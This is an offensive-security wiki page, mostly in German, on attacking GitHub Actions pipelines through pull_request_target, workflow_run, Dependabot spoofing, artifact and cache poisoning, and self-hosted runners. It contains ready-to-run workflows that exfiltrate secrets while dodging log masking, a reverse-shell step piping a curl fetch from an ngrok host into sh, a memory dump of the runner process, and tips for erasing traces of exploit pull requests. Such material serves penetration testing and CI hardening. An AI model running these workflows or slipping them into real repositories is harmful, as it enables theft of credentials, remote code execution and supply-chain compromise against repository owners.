# Missbrauch von Github Actions

{{#include ../../../banners/hacktricks-training.md}}

## Tools

Die folgenden Tools sind nützlich, um Github Action workflows zu finden und sogar verwundbare zu identifizieren:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - Schau dir auch dessen Checklist an in [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)

## Grundlegende Informationen

Auf dieser Seite findest du:

- Eine **Zusammenfassung aller Auswirkungen**, falls ein Angreifer Zugriff auf eine Github Action erlangt
- Verschiedene Wege, **Zugriff auf eine Action zu erhalten**:
- Über **Berechtigungen**, um die Action zu erstellen
- Missbrauch von **pull request**-bezogenen Triggern
- Missbrauch **anderer externer Zugriffstechniken**
- **Pivoting** von einem bereits kompromittierten Repo
- Schließlich ein Abschnitt über **post-exploitation techniques to abuse an action from inside** (um die genannten Auswirkungen zu verursachen)

## Zusammenfassung der Auswirkungen

Für eine Einführung zu [**Github Actions siehe die Grundinformationen**](../basic-github-information.md#github-actions).

Wenn du **beliebigen Code in GitHub Actions** innerhalb eines **repository** ausführen kannst, könntest du:

- **Secrets stehlen**, die an die pipeline gemountet sind, und **die Privilegien der pipeline missbrauchen**, um unautorisierten Zugriff auf externe Plattformen wie AWS und GCP zu erlangen.
- **Deployments kompromittieren** und andere **artifacts**.
- Wenn die pipeline Assets deployt oder speichert, könntest du das Endprodukt verändern und damit einen Supply-Chain-Angriff ermöglichen.
- **Code in custom workers ausführen**, um Rechenleistung zu missbrauchen und auf andere Systeme zu pivoten.
- **Repository code überschreiben**, abhängig von den mit dem `GITHUB_TOKEN` verbundenen Berechtigungen.

## GITHUB_TOKEN

Dieses "**secret**" (aus `${{ secrets.GITHUB_TOKEN }}` und `${{ github.token }}`) wird vergeben, wenn der Admin diese Option aktiviert:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

Dieses Token ist dasselbe, das eine **Github Application** verwenden würde, daher kann es dieselben Endpunkte erreichen: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Github sollte einen [**flow**](https://github.com/github/roadmap/issues/74) veröffentlichen, der **cross-repository** Zugriff innerhalb von GitHub erlaubt, sodass ein Repo auf andere interne Repos mit dem `GITHUB_TOKEN` zugreifen kann.

Die möglichen **Berechtigungen** dieses Tokens findest du unter: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

Beachte, dass das Token **nach Abschluss des Jobs abläuft**.\
Diese Tokens sehen so aus: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Einige interessante Dinge, die du mit diesem Token tun kannst:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> Beachte, dass du in mehreren Fällen **github user tokens inside Github Actions envs or in the secrets** finden kannst. Diese Tokens können dir erweiterte Berechtigungen für das Repository und die Organization geben.

<details>

<summary>Secrets in Github Action output auflisten</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Reverse shell mit secrets erhalten</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Es ist möglich, die Berechtigungen eines Github Token in Repositories anderer Nutzer zu prüfen, indem man **die Logs der Actions überprüft**:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Erlaubte Ausführung

> [!NOTE]
> Dies wäre der einfachste Weg, Github actions zu kompromittieren, da dieser Fall voraussetzt, dass du die Möglichkeit hast, **ein neues Repo in der organization zu erstellen**, oder **Schreibrechte an einem Repository** hast.
>
> Wenn du dich in diesem Szenario befindest, kannst du einfach die [Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action) prüfen.

### Ausführung durch Repo-Erstellung

Falls Mitglieder einer Organization **create new repos** können und du github actions ausführen kannst, kannst du **ein neues Repo erstellen und die auf organization level gesetzten secrets stehlen**.

### Ausführung über einen neuen Branch

Wenn du **einen neuen Branch in einem Repository erstellen kannst, das bereits eine konfigurierte Github Action enthält**, kannst du diese **modifizieren**, den Inhalt **hochladen**, und dann **die Action aus dem neuen Branch ausführen**. Auf diese Weise kannst du **exfiltrate repository and organization level secrets** (aber du musst wissen, wie sie genannt werden).

> [!WARNING]
> Jede Einschränkung, die nur innerhalb der workflow YAML implementiert ist (zum Beispiel, `on: push: branches: [main]`, job conditionals oder manuelle Gates), kann von Collaborators bearbeitet werden. Ohne externe Durchsetzung (branch protections, protected environments und protected tags) kann ein Contributor einen Workflow so umleiten, dass er auf dessen Branch läuft und gemountete secrets/permissions missbraucht werden.

Du kannst die modifizierte Action ausführbar machen **manuell,** wenn eine **PR erstellt wird** oder wenn **etwas Code gepusht wird** (je nachdem, wie auffällig du sein willst):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## Forked-Ausführung

> [!NOTE]
> Es gibt verschiedene Trigger, die einem Angreifer erlauben könnten, eine **Github Action eines anderen Repositories auszuführen**. Wenn diese triggerbaren Actions schlecht konfiguriert sind, könnte ein Angreifer in der Lage sein, sie zu kompromittieren.

### `pull_request`

Der Workflow-Trigger **`pull_request`** führt den Workflow jedes Mal aus, wenn ein Pull Request eingeht, mit einigen Ausnahmen: standardmäßig, wenn es das **erste Mal** ist, dass du **mitwirkst**, muss ein **Maintainer** die **Ausführung** des Workflows **freigeben**:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Da die **Standard-Beschränkung** für **Erstbeitragende** gilt, könntest du zunächst **einen validen Bug/Typo beheben** und dann **weitere PRs senden, um deine neuen `pull_request`-Privilegien zu missbrauchen**.
>
> **Ich habe das getestet und es funktioniert nicht**: ~~Eine andere Option wäre, ein Konto mit dem Namen von jemandem zu erstellen, der zum Projekt beigetragen hat, und sein Konto zu löschen.~~

Außerdem verhindert es standardmäßig **write permissions** und den **Zugriff auf Secrets** im Ziel-Repository, wie in den [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories) erwähnt:

> Mit Ausnahme von `GITHUB_TOKEN` werden **Secrets nicht an den Runner übergeben**, wenn ein Workflow aus einem **forked** Repository ausgelöst wird. Das **`GITHUB_TOKEN` hat nur Lesezugriff** in Pull Requests **aus forked Repositories**.

Ein Angreifer könnte die Definition der Github Action ändern, um beliebige Dinge auszuführen und beliebige Actions anzuhängen. Allerdings kann er wegen der erwähnten Beschränkungen keine Secrets stehlen oder das Repo überschreiben.

> [!CAUTION]
> **Ja, wenn der Angreifer in dem PR die Github Action ändert, die ausgelöst wird, wird seine Github Action verwendet und nicht die aus dem origin repo!**

Da der Angreifer auch den auszuführenden Code kontrolliert, könnte er selbst ohne Secrets oder Schreibrechte auf das `GITHUB_TOKEN` zum Beispiel **bösartige Artefakte hochladen**.

### **`pull_request_target`**

Der Workflow-Trigger **`pull_request_target`** hat **write permission** für das Ziel-Repository und **Zugriff auf Secrets** (und fragt nicht nach einer Genehmigung).

Beachte, dass der Workflow-Trigger **`pull_request_target`** im Base-Kontext ausgeführt wird und nicht in dem vom PR bereitgestellten Kontext (um **nicht vertrauenswürdigen Code auszuführen**). Für mehr Infos zu `pull_request_target` [**check the docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target).\
Außerdem, für mehr Infos zu diesem speziellen gefährlichen Einsatz, siehe [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Es könnte so aussehen, dass es sicher ist, **`pull_request_target`** zu verwenden, weil der **ausgeführte Workflow** der ist, der im **base** definiert ist und **nicht im PR**, aber es gibt einige Fälle, in denen das **nicht** zutrifft.

Und dieser wird **Zugriff auf Secrets** haben.

### `workflow_run`

Der [**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) Trigger erlaubt es, einen Workflow von einem anderen auszuführen, wenn dieser `completed`, `requested` oder `in_progress` ist.

In diesem Beispiel ist ein Workflow so konfiguriert, dass er ausgeführt wird, nachdem der separate "Run Tests" Workflow abgeschlossen ist:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Außerdem, laut der Dokumentation: Der durch das `workflow_run`-Event gestartete workflow kann **access secrets and write tokens, even if the previous workflow was not**.

This kind of workflow could be attacked if it's **depending** on a **workflow** that can be **triggered** by an external user via **`pull_request`** or **`pull_request_target`**. A couple of vulnerable examples can be [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** The first one consist on the **`workflow_run`** triggered workflow downloading out the attackers code: `${{ github.event.pull_request.head.sha }}`  
The second one consist on **passing** an **artifact** from the **untrusted** code to the **`workflow_run`** workflow and using the content of this artifact in a way that makes it **vulnerable to RCE**.

### `workflow_call`

TODO

TODO: Prüfen, ob beim Ausführen aus einem pull_request der verwendete/heruntergeladene Code aus dem Origin-Repo oder aus dem geforkten PR stammt

## Missbrauch von Forked Execution

Wir haben alle Wege erwähnt, wie ein externer Angreifer einen github workflow zur Ausführung bringen könnte. Schauen wir uns nun an, wie diese Ausführungen, wenn sie schlecht konfiguriert sind, missbraucht werden könnten:

### Untrusted checkout execution

Im Fall von **`pull_request`** wird der workflow im **Kontext des PR** ausgeführt (er führt also den **malicious PRs code** aus), aber jemand muss ihn zuerst **autorize** und er läuft mit einigen [Einschränkungen](#pull_request).

Im Fall eines workflows, der **`pull_request_target` or `workflow_run`** verwendet und von einem workflow abhängt, der durch **`pull_request_target` oder `pull_request`** ausgelöst werden kann, wird der Code aus dem Original-Repo ausgeführt, sodass der **attacker cannot control the executed code**.

> [!CAUTION]
> However, if the **action** has an **explicit PR checkou**t that will **get the code from the PR** (and not from base), it will use the attackers controlled code. For example (check line 12 where the PR code is downloaded):

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Der potenziell **untrusted code is being run during `npm install` or `npm build`**, da die Build-Skripte und referenzierten **packages are controlled by the author of the PR**.

> [!WARNING]
> A github dork to search for vulnerable actions is: `event.pull_request pull_request_target extension:yml` however, there are different ways to configure the jobs to be executed securely even if the action is configured insecurely (like using conditionals about who is the actor generating the PR).

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Beachte, dass es bestimmte [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) gibt, deren Werte vom **user** erzeugenden PR **controlled** werden. Wenn die github action diese **data to execute anything** verwendet, könnte das zu **arbitrary code execution** führen:

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Laut der Dokumentation: Du kannst eine **environment variable für alle nachfolgenden Schritte** in einem workflow job verfügbar machen, indem du die Environment-Variable definierst oder aktualisierst und dies in die **`GITHUB_ENV`** environment file schreibst.

Wenn ein Angreifer beliebige Werte in diese **env**-Variable **inject** könnte, könnte er Umgebungsvariablen einschleusen, die in nachfolgenden Schritten Code ausführen, z. B. **LD_PRELOAD** oder **NODE_OPTIONS**.

Zum Beispiel (siehe [**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) und [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), stell dir einen workflow vor, der einem hochgeladenen artifact vertraut und dessen Inhalt in die **`GITHUB_ENV`** env variable schreibt. Ein Angreifer könnte etwas wie das Folgende hochladen, um es zu kompromittieren:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot and other trusted bots

Wie in [**this blog post**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest) angegeben, haben mehrere Organisationen eine Github Action, die jeden PR von `dependabot[bot]` merged, wie in:
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
Das ist ein Problem, weil das Feld `github.actor` den Benutzer enthält, der das letzte Ereignis verursacht hat, das den Workflow ausgelöst hat. Es gibt mehrere Wege, den Benutzer `dependabot[bot]` dazu zu bringen, einen PR zu verändern. Zum Beispiel:

- Forke das Repository des Opfers
- Füge die bösartige Payload zu deiner Kopie hinzu
- Aktiviere Dependabot in deinem Fork, indem du eine veraltete Dependency hinzufügst. Dependabot erstellt einen Branch, der die Dependency behebt — mit bösartigem Code.
- Öffne von diesem Branch einen Pull Request zum Repository des Opfers (der PR wird vom Benutzer erstellt, daher passiert vorerst nichts)
- Dann geht der Angreifer zurück zum initialen PR, den Dependabot in seinem Fork geöffnet hat, und führt `@dependabot recreate` aus
- Danach führt Dependabot einige Aktionen in diesem Branch aus, die den PR im Repository des Opfers ändern, wodurch `dependabot[bot]` zum Actor des letzten Ereignisses wird, das den Workflow auslöste (und damit der Workflow ausgeführt wird).

Weiterhin: was wäre, wenn statt des Mergings die Github Action eine command injection hätte, wie in:
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
Nun, der ursprüngliche Blogpost schlägt zwei Optionen vor, dieses Verhalten auszunutzen — die zweite ist:

- Fork the victim repository and enable Dependabot with some outdated dependency.
- Create a new branch with the malicious shell injeciton code.
- Change the default branch of the repo to that one
- Create a PR from this branch to the victim repository.
- Run `@dependabot merge` in the PR Dependabot opened in his fork.
- Dependabot will merge his changes in the default branch of your forked repository, updating the PR in the victim repository making now the `dependabot[bot]` the actor of the latest event that triggered the workflow and using a malicious branch name.

### Verwundbare Third Party Github Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Wie in [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks) erwähnt, erlaubt diese Github Action den Zugriff auf artifacts aus verschiedenen Workflows und sogar Repositories.

Das Problem ist, dass wenn der **`path`**-Parameter nicht gesetzt ist, das artifact im aktuellen Verzeichnis entpackt wird und Dateien überschreiben kann, die später im Workflow verwendet oder sogar ausgeführt werden. Daher könnte ein Angreifer, falls das Artifact verwundbar ist, dies ausnutzen, um andere Workflows zu kompromittieren, die dem Artifact vertrauen.

Example of vulnerable workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Dies könnte mit diesem Workflow angegriffen werden:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## Weitere externe Zugriffe

### Deleted Namespace Repo Hijacking

Wenn ein Account seinen Namen ändert, kann ein anderer Nutzer nach einiger Zeit ein Konto mit diesem Namen registrieren. Wenn ein Repository vor der Namensänderung **weniger als 100 stars** hatte, erlaubt Github dem neu registrierten Nutzer mit demselben Namen, ein **repository with the same name** wie das gelöschte zu erstellen.

> [!CAUTION]
> Wenn also eine Action ein Repo von einem nicht existierenden Account verwendet, ist es trotzdem möglich, dass ein Angreifer dieses Konto erstellt und die Action compromise.

Wenn andere Repositories **dependencies from this user repos** verwendeten, kann ein Angreifer sie hijacken. Hier findest du eine ausführlichere Erklärung: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> In diesem Abschnitt sprechen wir über Techniken, die es erlauben würden, **pivot from one repo to another**, vorausgesetzt wir haben irgendeinen Zugang zum ersten (siehe vorheriger Abschnitt).

### Cache Poisoning

Ein Cache wird zwischen **workflow runs in the same branch** gehalten. Das bedeutet, dass wenn ein Angreifer ein **compromise** eines **package** erreicht, das dann im Cache gespeichert wird und von einem **more privileged** workflow **downloaded** und ausgeführt wird, er auch diesen workflow **compromise** kann.

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Workflows können **artifacts from other workflows and even repos** nutzen. Wenn ein Angreifer es schafft, die Github Action zu **compromise**, die ein **uploads an artifact**, das später von einem anderen workflow verwendet wird, könnte er damit **compromise the other workflows**:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Post-Exploitation von einer Action

### Github Action Policies Bypass

Wie in [**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass) erwähnt: Selbst wenn ein Repository oder eine Organization eine Policy hat, die die Nutzung bestimmter Actions einschränkt, könnte ein Angreifer einfach eine Action innerhalb des workflow herunterladen (`git clone`) und sie dann als lokale Action referenzieren. Da die Policies lokale Pfade nicht betreffen, **die Action wird ohne Einschränkungen ausgeführt.**

Beispiel:
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### Zugriff auf AWS und GCP über OIDC

Check the following pages:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### Zugriff auf secrets <a href="#accessing-secrets" id="accessing-secrets"></a>

Wenn du Content in ein Skript injizierst, ist es interessant zu wissen, wie du auf secrets zugreifen kannst:

- Wenn das secret oder token als **environment variable** gesetzt ist, kann es direkt über die Umgebung mit **`printenv`** ausgelesen werden.

<details>

<summary>secrets in Github Action-Ausgabe auflisten</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>reverse shell mit secrets erhalten</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- If the secret is used **directly in an expression**, the generated shell script is stored **on-disk** and is accessible.
- ```bash
cat /home/runner/work/_temp/*
```
- For a JavaScript actions the secrets and sent through environment variables
- ```bash
ps axe | grep node
```
- For a **custom action**, the risk can vary depending on how a program is using the secret it obtained from the **argument**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- Enumerate all secrets via the secrets context (collaborator level). A contributor with write access can modify a workflow on any branch to dump all repository/org/environment secrets. Use double base64 to evade GitHub’s log masking and decode locally:

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

Decode locally:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

Tip: for stealth during testing, encrypt before printing (openssl is preinstalled on GitHub-hosted runners).

### Missbrauch von Self-hosted runners

The way to find which **Github Actions are being executed in non-github infrastructure** is to search for **`runs-on: self-hosted`** in the Github Action configuration yaml.

**Self-hosted** runners might have access to **extra sensitive information**, to other **network systems** (vulnerable endpoints in the network? metadata service?) or, even if it's isolated and destroyed, **more than one action might be run at the same time** and the malicious one could **steal the secrets** of the other one.

In self-hosted runners it's also possible to obtain the **secrets from the \_Runner.Listener**\_\*\* process\*\* which will contain all the secrets of the workflows at any step by dumping its memory:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
Siehe [**this post for more information**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker-Image-Registry

Es ist möglich, Github actions zu erstellen, die ein Docker-Image innerhalb von Github **bauen und speichern**. Ein Beispiel findet sich im folgenden ausklappbaren Bereich:

<details>

<summary>Github Action Build & Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Wie Sie im vorherigen Code sehen konnten, wird die Github registry auf **`ghcr.io`** gehostet.

Ein Benutzer mit Lesezugriff auf das repo kann dann das Docker Image mit einem personal access token herunterladen:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Dann könnte der Nutzer nach **leaked secrets in the Docker image layers:** suchen

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Sensible Informationen in Github Actions-Logs

Auch wenn **Github** versucht, **secret values** in den Actions-Logs zu **erkennen** und **nicht anzuzeigen**, werden **andere sensitive Daten**, die während der Ausführung der Action erzeugt wurden, nicht verborgen. Zum Beispiel wird ein JWT, das mit einem Secret signiert wurde, nicht verborgen, es sei denn, es ist [speziell konfiguriert](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Spuren verwischen

(Technique from [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Zuerst ist jeder erstellte PR für die Öffentlichkeit auf Github und für das Ziel-GitHub-Konto deutlich sichtbar. In GitHub kann man standardmäßig **einen PR aus dem Internet nicht löschen**, aber es gibt einen Haken. Für Github-Konten, die von Github **suspendiert** werden, werden alle ihre **PRs automatisch gelöscht** und aus dem Internet entfernt. Um also deine Aktivität zu verbergen, musst du entweder dein **GitHub-Konto suspendiert bekommen** oder dein Konto markieren lassen. Das würde **all deine Aktivitäten** auf GitHub aus dem Internet verbergen (im Grunde alle deine exploit PRs entfernen).

Eine Organization auf GitHub ist sehr proaktiv darin, Konten an GitHub zu melden. Alles, was du tun musst, ist „ein paar Sachen“ in einem Issue zu posten, und sie sorgen dafür, dass dein Konto innerhalb von 12 Stunden suspendiert wird :p und voilà — dein Exploit ist auf github unsichtbar.

> [!WARNING]
> Der einzige Weg für eine Organization herauszufinden, dass sie ins Visier genommen wurde, ist, die GitHub-Logs im SIEM zu prüfen, da der PR in der GitHub-UI entfernt würde.

## Quellen

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

{{#include ../../../banners/hacktricks-training.md}}
